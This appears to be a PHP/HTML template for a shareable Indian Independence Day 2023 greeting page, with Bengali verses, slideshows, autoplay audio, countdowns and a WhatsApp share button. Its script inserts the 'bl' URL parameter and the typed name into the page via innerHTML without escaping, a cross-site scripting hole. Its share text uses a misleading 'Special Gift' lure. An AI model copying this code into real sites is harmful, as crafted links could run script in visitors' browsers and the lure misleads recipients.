<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="40px" width="30px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="40px" width="30px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="40px" width="30px"/><br><br>
  <img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i4.png" style="z-index: 199;" height="40px" width="30px"/><br><br>
 <img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="40px" width="30px"/><br><br>
  <img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i1.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i2.png" style="z-index: 1999" height="50px" width="40px"/><br><br>
<img src="<?= base_url() ?>msb/wish/img/i3.png" style="z-index: 199;" height="50px" width="40px"/><br><br>
</marquee>
</center> 


  <div class="TOFIQUEncontainer">

    <div class="TOFIQUE-main-greeting">

<div style="background-color: rgb(0 0 0 / 90%); color: white; font-weight: bold; 
          font-size: 18px;text-align:center; ">
<font color="white"> <p id="TOFIQUE"></p>
</font></div>

<div style="background:#0c13d9; color: white; font-weight: bold; padding-top: 6px; padding-bottom: 6px; font-size: large;text-align:center; ">

<h2 class="font-effect-neon" align=center" id="TOFIQUE-show-name">MSB</h2>
</div>
<div style="background: url(Navratri.png); background-color: black; color: white; font-weight: bold; padding-top: 6px; padding-bottom: 6px; font-size: large;text-align:center; ">
</font></div>
        <div class="font-effect-neon"><p class="fromMessage" id="TOFIQUE-fromMessage"></p></div>
        
<center>
       
       <!---  <p id="demo"></p>----->                                                                            
                                                                                     
    </center>                                                                                    

</center>
 <center><span style="color: #ffffff;font-size: 15px;">
বাতাসকে বলে দাও,
আলো জ্বালিয়ে রাখবে প্রদীপ!
যাকে আমরা রক্ত ​​দিয়ে রক্ষা করেছি,
আপনার হৃদয়ে সর্বদা এমন তেরঙ্গা রাখুন।
শুভ স্বাধীনতা দিবস!<span>

</center><br>

<center><img src="<?= base_url() ?>img/day.png" class="img-responsive" alt="TOFIQUE" width="95%"></center><br>

<div class="vi" style="text-align: center;">

<br>
     <div style="background-color: #ff8923; border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: white; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 80%;">
<marquee behavior="alternate"><b>
Play Song & Happy Independence 2023 
</b></marquee>
</div>
<div style="background-color:#66cc00; border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 80%; scrollamount="5">
<marquee behavior="alternate"><b>
Happy Independence 2023 
</b></marquee>
</div>
</div><br>
      
      <script>
  function play(){
       var audio = document.getElementById("audio");
       audio.play();
                 }
   </script>
<audio id="audio" src="<?= base_url() ?>msb/wish/img/b.mp3"></audio>
<a class="rope" style="text-decoration:none;" href="#" onclick="play()">
      
<audio controls autoplay style='width: 230px;'>
  <source src="<?= base_url() ?>msb/wish/img/Hum logo Ko samajh Sako to.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>
</br>
<center style="padding-top: 15px;"><img src="msb/wish/img/Independence Day.gif" class="img-responsive" alt="TOFIQUE" width="95%"></center>
</br>

</br>
<center>
<h3 style="text-shadow: 2px 2px #040202;" ><span><font color="white">কিছু নেশা তিরঙ্গার পতাকার অন্তর্গত,</font></span><br>
<span><font color="white">কিছু নেশা মাতৃভূমির অহংকার</font></span><br>
<span><font color="white">আমরা এই তেরঙ্গা সর্বত্র দোলাবো</font></span><br>
<font color="white">নেশা ভারতের গর্ব</font></span>
</h3>
</center>
</br>
<center><img src="<?= base_url() ?>img/Patriotism12.png" class="img-responsive" alt="TOFIQUE" width="95%"></center>
</br>

</br>
<center>
<h3 style="text-shadow: 2px 2px #040202;" ><span><font color="white">সারা বিশ্বে প্রতিধ্বনিত হচ্ছে ভারতের সংস্কৃতি,
দেশের আকাশে জ্বলছে তারা !</font></span>
<span><font color="white">স্বাধীনতা দিবসে একত্রিত হও</font></span><br><br>
<span><font color="white">প্রার্থনার উচ্চতায় আমাদের তেরঙ্গা দোলাতে থাকুক!!
শুভ স্বাধীনতা দিবস…</font></span><br><br><br>
<span><font color="#ff8923">আপনাদের সবাইকে স্বাধীনতা দিবসের শুভেচ্ছা </font></span><br>
<font color="#fff">শুভ কামনা!!</font></span>
</h3>
</center>
</br>

<div class="TOFIQUE-slideshow-container">
<div class="TOFIQUESlides fade">
  <img src="<?= base_url() ?>msb/wish/img/republic-day.gif" style="width:430px;height:230px;-webkit-border-radius: 0px 0px 0px 0px;-moz-border-radius: 0px 0px 0px0px;border-radius: 0px 0px 0px 0px;border:1px solid #ff6600;background:rgba(32,43,27,0.4);-webkit-box-shadow: #B3B3B3 3px 4px 3px;-moz-box-shadow: #B3B3B3 3px 3px 3px; box-shadow: #B3B3B3 3px 3px 3px;"/>
  
</div>

<div class="TOFIQUESlides fade">
  <img src="<?= base_url() ?>msb/wish/img/butterfly-india.gif" style="width:430px;height:230px;-webkit-border-radius: 0px 0px 0px 0px;-moz-border-radius: 0px 0px 0px0px;border-radius: 0px 0px 0px 0px;border:1px solid #ce082c;background:rgba(32,43,27,0.4);-webkit-box-shadow: #B3B3B3 3px 4px 3px;-moz-box-shadow: #B3B3B3 3px 3px 3px; box-shadow: #B3B3B3 3px 3px 3px;"/>
  
</div>

<div class="TOFIQUESlides fade">
  <img src="<?= base_url() ?>msb/wish/img/Independence-Day.gif" style="width:430px;height:230px;-webkit-border-radius: 0px 0px 0px 0px;-moz-border-radius: 0px 0px 0px0px;border-radius: 0px 0px 0px 0px;border:1px solid #063dc9;background:rgba(32,43,27,0.4);-webkit-box-shadow: #B3B3B3 3px 4px 3px;-moz-box-shadow: #B3B3B3 3px 3px 3px; box-shadow: #B3B3B3 3px 3px 3px;"/>
  
  
</div>
</div>
<br>
     <div style="background-color: #FF0000; border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: white; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 80%;">
<marquee behavior="alternate"><b>
👇 Click To Watch The Video 👇
</b></marquee>
</div>
<br>
<center><img width="95%" height="315" src="<?= base_url() ?>msb/wish/img/indian.png" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"></center>
<br>
<center><img src="<?= base_url() ?>msb/wish/img/c.gif" class="img-responsive" alt="TOFIQUE" width="30%"></center>
<br><br><br>

<div style="text-align:center">
  <span class="TOFIQUEdot"></span> 
  <span class="TOFIQUEdot"></span> 
  <span class="TOFIQUEdot"></span> 
  <span class="TOFIQUEdot"></span>
  <span class="TOFIQUEdot"></span>
  <span class="TOFIQUEdot"></span>
  <span class="TOFIQUEdot"></span>
  <span class="TOFIQUEdot"></span>
  <span class="TOFIQUEdot"></span>
</div>

<!-----PLACE ADS HARE----->
 <center><div class="separator" style="clear: both; text-align: center;"><a href="<?= base_url() ?>msb/wish/img/Independence-Day.gif" ><img border="0" data-original-height="320" data-original-width="300" height="50" src="<?= base_url() ?>msb/wish/img/Independence-Day.gif" width="320" /></a></div><br />&nbsp;<p></p></center>
<br>

<!-----ADS PLACE END----->


<script>
var slideIndex = 0;
showSlides();

function showSlides() {
    var i;
    var slides = document.getElementsByClassName("TOFIQUESlides");
    var dots = document.getElementsByClassName("TOFIQUEdot");
    for (i = 0; i < slides.length; i++) {
       slides[i].style.display = "none";  
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1}    
    for (i = 0; i < dots.length; i++) {
        dots[i].className = dots[i].className.replace(" active", "");
    }
    slides[slideIndex-1].style.display = "block";  
    dots[slideIndex-1].className += " active";
    setTimeout(showSlides, 4000); // Change image every 4 seconds
}
</script>
<div id="formBox" >
<form method="POST" action="ready.php">
          <input type="text" class="form-control" name="name" value="MSB" id="nameTextBox"  placeholder="Enter Your Name">
          <div id="goButton" onclick="createGreeting()">
          Click
          </div>
        </div>
        <a class="footerbtn" href="javascript:void(0)" onclick="shareActionWA()">
          <img width="25px" height="25px" src="<?= base_url() ?>img/wht.png">
          <b style="font-size: 15px;position:  relative;top: -3px;margin: 0 10px;">Share with your Friends</b>
          <img width="25px" height="25px" src="<?= base_url() ?>img/wht.png">
        </a>
    </div>
	</form>
        </div> 
  </body>

  <script>
      var jqs = function(sParam) {
        var sPageURL = window.location.search.substring(1);
        var sURLVariables = sPageURL.split("&");
        for (var i = 0; i < sURLVariables.length; i++) {
            var sParameterName = sURLVariables[i].split("=");
            if (sParameterName[0] === sParam) {
              return sParameterName[1];
            }
          }
      };
    window.jqs = jqs;
    var name = decodeURI(jqs("bl"));
    if (typeof jqs("bl") === "undefined") {
      name = "";
    }
    var checkName = function() {
      if (name.length !== 0) {
        name = name.replace(/-/g, " ");
        console.log("name is there", name);
        document.querySelector("#TOFIQUE-show-name").innerHTML = name;
        document.querySelector("#TOFIQUE-fromMessage").innerHTML= "Wishing You"
      } else {

      }
    };

    checkName();
     play();

    var createGreeting=function(){

      // ga('send', {
      //   hitType: 'event',
      //   eventCategory: 'interaction',
      //   eventAction: 'click',
      //   eventLabel: 'goButtonClicked'
      // });

      gtag('event', 'click', {
            'event_category': 'interaction',
            'event_label': 'goButtonClicked',
      });

      sname=document.querySelector("#nameTextBox").value;
      sname=sname.replace(/@/g,"-")
      sname=sname.replace(/%40/g,"-")
      sname=sname.replace(/\./g,"-")
      if(sname.trim()!=""){
        document.querySelector("#formBox").style.display = "none";
        document.querySelector(".footerbtn").style.display = "block";
        document.querySelector("#TOFIQUE-show-name").innerHTML = sname;
        document.querySelector("#TOFIQUE-fromMessage").innerHTML= "MSBBILLINGS.IN to share with your friends";
        window.scrollTo(0,0);
      }else {
        alert ("Please Type Your Name First");
        document.getElementById("nameTextBox").focus();
      }
    }

    var shareActionWA = function() {
      gtag('event', 'click', {
            'event_category': 'interaction',
            'event_label': 'shareOnWhatsAppClicked',
      });

      var shareString = "";
      var whatsappHref;
      shareString += "*"+sname+"*";

      
      shareString +=" Send You Special Gift For You Click On Blue Line%0AðŸ‘‰"
      shareString +=(window.location.href.split("?")[0] + "?bl=" + sname).replace("#", "").replace(/ /g, "-");
     

      whatsappHref = "whatsapp://send?text=" + shareString;
      window.location.href = whatsappHref;

    };
    var countDownDate = new Date("Aug 15, 2023 00:00:00").getTime();

    // Update the count down every 1 second
    var x = setInterval(function() {
        // Get todays date and time
        var now = new Date().getTime();

        // Find the distance between now an the count down date
        var distance = countDownDate - now;

        // Time calculations for days, hours, minutes and seconds
        var days = Math.floor(distance / (1000 * 60 * 60 * 24));
        var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((distance % (1000 * 60)) / 1000);

        // Output the result in an element with id="demo"
        document.getElementById("demoo").innerHTML = days + "days " + hours + "hr "+ minutes + "min " + seconds + "sec ";

        // If the count down is over, write some text
        if (distance < 0)
         {
            clearInterval(x);
            document.getElementById("demoo").innerHTML = "";
            document.getElementById("inAdvance").innerHTML = "";

        }
    }, 1000);
  </script>
<!-- Display the countdown timer in an element -->


<script>
// Set the date we're counting down to
var countDownDate = new Date("Aug 15, 2023 00:00:00").getTime();

// Update the count down every 01 second
var x = setInterval(function() {

  // Get todays date and time
  var now = new Date().getTime();

  // Find the distance between now an the count down date
  var distance = countDownDate - now;

  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Display the result in the element with id="TOFIQUE"
  document.getElementById("TOFIQUE").innerHTML = days + "<i> Days,</i> " + hours + " <i>Hrs,</i> "
  + minutes + "<i> Min,</i> " + seconds + "<i> Sec</i> ";

  // If the count down is finished, write some text 
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("TOFIQUE").innerHTML = ".";
  }
}, 1000);
</script>        

<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA--1');
  // ga('create', 'UA--1');
  // ga('require', 'linker');
  // ga('send', 'pageview');
</script>
  
<script>
// Set the date we're counting down to
var countDownDate = new Date("Aug 15, 2023 00:00:01").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

  // Get today's date and time
  var now = new Date().getTime();
    
  // Find the distance between now and the count down date
  var distance = countDownDate - now;
    
  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
  // Output the result in an element with id="demo"
  document.getElementById("demo").innerHTML = days + "d " + hours + "h "
  + minutes + "m " + seconds + "s ";
    
  // If the count down is over, write some text 
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "EXPIRED";
  }
}, 1000);
     

function playAudio() {
  var x = document.getElementById("myAudio");
  x.play();
}
$( document ).ready(function() {
 $('audio')[0].playAudio();
var audio = $("audio")[0];
audio.play()
});
  
</script>


</html>
